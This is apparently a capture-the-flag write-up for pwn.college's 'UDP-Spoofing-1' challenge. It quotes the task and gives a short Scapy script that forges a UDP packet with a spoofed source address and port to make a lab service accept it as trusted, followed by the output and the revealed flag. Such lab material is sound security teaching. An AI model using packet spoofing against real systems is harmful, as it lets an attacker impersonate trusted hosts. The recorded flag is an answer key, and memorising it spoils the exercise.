---
layout: page
title: "✅ UDP-Spoofing-1 Challenge"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


**Task**:  
There are two dangers to UDP:  
1. It is often used in places where people are already cutting corners for performance's sake.  
2. It forces the programmer to keep track of sessions explicitly.  

This combination can cause security issues.

In this challenge, one side of the connection can confuse a non-trusted connection for a trusted connection, and print the flag.  
Can you trigger this confusion?

> **NOTE**: In this level, the flag will just be printed to the console when you trigger the confusion. We'll work on realistically exfiltrating it later.

---

**Solution**:
```python
from scapy.all import IP, UDP, Raw, send

pkt = IP(dst='10.0.0.2', src='10.0.0.3') / UDP(dport=31338, sport=31337) / Raw(load=b'FLAG')
send(pkt)
```

output:
```
.
Sent 1 packets.
YOUR FLAG: pwn.college{gW3Lms0isRcIaNKYem4r42cR8um.0FN0AjNxwSM0IzMyEzW}
```
---
